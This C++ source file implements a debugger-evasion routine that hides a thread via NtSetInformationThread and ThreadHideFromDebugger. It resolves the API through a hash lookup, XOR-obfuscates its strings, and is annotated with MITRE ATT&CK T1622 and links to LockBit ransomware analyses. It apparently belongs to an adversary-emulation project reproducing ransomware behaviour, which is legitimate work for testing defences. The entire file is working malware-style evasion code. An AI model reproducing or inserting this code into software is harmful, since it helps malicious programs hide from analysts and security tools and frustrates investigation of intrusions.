#include "defense_evasion.hpp"
#include "crypto/xor_obfuscation.hpp"
#include <format>
#include <stdexcept>

namespace defense_evasion {

/*
 * HideThreadFromDebugger:
 *      About:
 *          Hides the given thread from debuggers by setting its thread information to ThreadHideFromDebugger
 *          using the NtSetInformationThread API call. Throws exception on failure.
 *      Result:
 *          Hides given thread from debugger. Throws exception on failure.
 *      MITRE ATT&CK Techniques:
 *          T1622: Debugger Evasion
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
void HideThreadFromDebugger(HANDLE h_thread) {
    DWORD error_code;
    FP_NtSetInformationThread ntSetInformationThread = (FP_NtSetInformationThread)winapi_helper::GetAPI(
        0x54212e31, 
        XOR_WIDE_LIT(L"ntdll.dll"), 
        &error_code
    );
    if (ntSetInformationThread == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for NtSetInformationThread. Error code"), error_code));
    }
    
    NTSTATUS result = ntSetInformationThread(h_thread, ThreadHideFromDebugger, NULL, NULL);
    if (result != STATUS_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to hide thread from debugger. NTSTATUS"), result));
    }
}

} // namespace